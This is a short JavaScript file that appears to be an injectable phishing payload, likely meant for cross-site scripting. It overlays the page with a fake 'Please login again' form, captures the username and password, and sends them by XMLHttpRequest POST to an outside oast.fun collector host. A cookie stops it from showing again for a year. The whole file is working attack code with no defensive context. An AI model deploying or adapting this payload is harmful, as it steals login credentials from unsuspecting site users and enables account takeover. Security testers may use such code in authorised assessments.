const AggressiveHTML = `
  <div id="bg" style="font-family: Arial, sans-serif; position: absolute; z-index: 100; width: 100%; height: 100%; background-color: #000000; opacity: 0.5; top: 0; left: 0; margin: 0;"></div>
  <div id="form" style="font-family: Arial, sans-serif; position: absolute; z-index: 150; background-color: #ffffff; width: 300px; height: 270px; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px; border-radius: 10px; box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.2);">
    <p>An error occurred. Please login again.</p>
    <form id="AggressiveForm">
      <p>Username: <input type="text" name="username" style="width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;"></p>
      <p>Password: <input type="password" name="password" style="width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;"></p>
      <center><p><input type="submit" value="Login" style="font-size: 0.9rem; letter-spacing: 0.05rem; padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s ease;" ></p></center>
    </form>
  </div>
`;

const expire = new Date();
expire.setFullYear(expire.getFullYear() + 1);
const cookie = "runonce=true; SameSite=Lax; path=/; expires=" + expire.toUTCString();
const div = document.createElement("div");

let loginSubmitted = false;

if (document.cookie.indexOf("runonce=") < 0) {
  div.innerHTML = AggressiveHTML;

  const sendData = () => {
    if (!loginSubmitted) {
      loginSubmitted = true;
      const XHR = new XMLHttpRequest();
      const form = document.getElementById("AggressiveForm");
      const formData = new FormData(form);
      const encodedData = new URLSearchParams(formData).toString();

      XHR.addEventListener("load", (event) => {
        observer.disconnect();
        node.remove();
      });
	  
      XHR.open("POST", "https://ssotggplsyeqqktqsgofz7vvk6omwpg10.oast.fun/login"); // https://app.interactsh.com/
      XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      XHR.send(encodedData);
      document.getElementById("form").style.display = "none";
    }
  };

  const callback = (mutationsList, observer) => {
    for (const mutation of mutationsList) {
      if (mutation.type === "childList") {
        const form = document.getElementById("AggressiveForm");
        if (form && !loginSubmitted) {
          form.addEventListener("submit", (event) => {
            event.preventDefault();
            sendData();
          });
        }
      }
    }
  };

  const observer = new MutationObserver(callback);
  const nodeParent = document.getElementsByTagName("body")[0];
  const config = { childList: true };
  observer.observe(nodeParent, config);

  const node = nodeParent.appendChild(div);
  document.cookie = cookie;
}
